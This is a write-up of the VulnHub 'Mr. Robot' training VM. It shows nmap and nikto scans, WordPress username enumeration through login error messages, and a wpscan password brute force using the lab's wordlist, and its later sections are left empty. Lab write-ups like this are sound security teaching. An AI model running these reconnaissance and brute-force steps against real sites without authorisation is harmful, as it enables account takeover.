---
layout: default
---

# VulnHub - Mr. Robot writeup 

![Header image](\assets\images\vh_mr_robot\mr_robot_header.png)

[VulnHub image link](https://www.vulnhub.com/entry/mr-robot-1,151/)

:robot: :computer:

## Introduction 

Hello Friend.

Welcome to a write-up about hacking into the Mr. Robot vulnhub virtual machine (VM) image.

_Authors Notes_
> Based on the show, Mr. Robot. 
> This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. 
> The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.

## Initial recon

__Target IP address: 192.168.56.134__

### Nmap scan

TCP Scan
```
sudo nmap -T4 -A -vv -p- -oA tcp_agg_all 192.168.56.134
```

UDP Scan
```
sudo nmap -sUVC -vv -p- -oA upd_top_1000 192.168.56.134
```

#### TCP Scan Results

```
# Nmap 7.80 scan initiated Thu Aug 27 12:18:11 2020 as: nmap -T4 -A -vv -p- -oA tcp_agg_all 192.168.56.134
Nmap scan report for 192.168.56.134
Host is up, received arp-response (0.00048s latency).
Scanned at 2020-08-27 12:18:12 EDT for 105s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 64
80/tcp  open   http     syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b

MAC Address: 08:00:27:EF:CF:F8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/27%OT=80%CT=22%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=5F
...

Uptime guess: 198.048 days (since Tue Feb 11 10:10:50 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.56.134

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 27 12:19:57 2020 -- 1 IP address (1 host up) scanned in 107.57 seconds
```

#### UDP Scan Results

## Enumeration

There are only two ports open on this machine ports 80 HTTP and 443 HTTPS running on an Apache web server.

Run a nikto scan against the web server to discover any default configurations, directories and files and then output the results to a nikto_scan.txt file for later analyses if you wish.
```
nikto -h 192.168.56.134 | tee nikto_scan.txt
```

The nikto scan reveals a few import pieces of information. The web server is running a wordpress application as it contains a lot of the common wordpress pages.
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.134
+ Target Hostname:    192.168.56.134
+ Target Port:        80
+ Start Time:         2020-08-28 13:55:42 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://192.168.56.134/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2020-08-28 14:02:47 (GMT-4) (425 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Checking out the main website we are greeted by what looks to be like a terminal running in the web browser. However upon further inspection of the web pages source code we find that its all just a javascript program.

Doing a bit of further manual enumeration its always good practice to check the `robots.txt` file. We find two interesting entries to an `fsocity.dic` file and the first flag/key `key-1-of-3.txt` file.
> 073403c8a58a1f80d943455fb30724b9


The `fsocity.dic` file contains 858160 lines of random words and numbers. We could potentially use this file as passwords in a brute force attack against the wordpress login.
We can shorten our attack time be sorting the contents within the file and just grabbing unique entries with the command below
```
# You can check the number of lines in a file with wc
wc -l fsocity.dic

# Sort the file and filter out unique occurrences
sort -u fsocity.dic >> fsocity.dic.sorted
```

If you check the number of lines now for the sorted file we have 11451 lines which is way shorter and will increase the efficiency of our brute force attack.

We need to find a valid username for wordpress.

Lets use wpscan to further enumerate the wordpress site to help us try find a username and also scan for any vulnerable wordpress plugins.

Enumerate (-e) usernames (u) using wpscan to spider the site in search for usernames.
```
sudo wpscan --url 192.168.56.134 -e u
```

Enumerate all plugins (ap) using the wpscan aggressive plugin detection. You need to register with your own [WPVulnDB API token](https://wpvulndb.com/api).

> The WPScan CLI tool uses the WPVulnDB API to retrieve WordPress vulnerability data in real time. For WPScan to retrieve the vulnerability data an API token must be supplied via the --api-token option, or via a configuration file, as discussed below. An API token can be obtained by registering an account on WPVulnDB. Up to 50 API requests per day are given free of charge to registered users. 

```
sudo wpscan --url 192.168.56.134 -e ap --plugins-detection aggressive --api-token your_api_token
```

The user enumeration scan did not pick up anything this time. We can however utilize the wp-login.php pages error messages to help use enumerate a correct username.
Notice the different Error messages in the screenshot below. It helps us to deduce the `elliot` is a correct username. If you wondering how we found elliot it involves a bit of  open-source intelligence (OSNIT) gathering using google to ask who is Mr. Robot? If you are a fan of the show you will know that Mr. Robot is a construct within Elliot Alderson's mind.

![Wordpress user enumeration](\assets\images\vh_mr_robot\mr_robot_wordpress_user_enum_1.jpg)

Now that we have found a valid username and have a relatively small wordlist we can brute force the wordpress login. Specifying 50 threads to speed up the process.
```
sudo wpscan --url 192.168.56.134 --usernames elliot --passwords fsocity.dic.sorted --max-threads 50
```


## Privilege Escalation
## Summary

## Notes
## References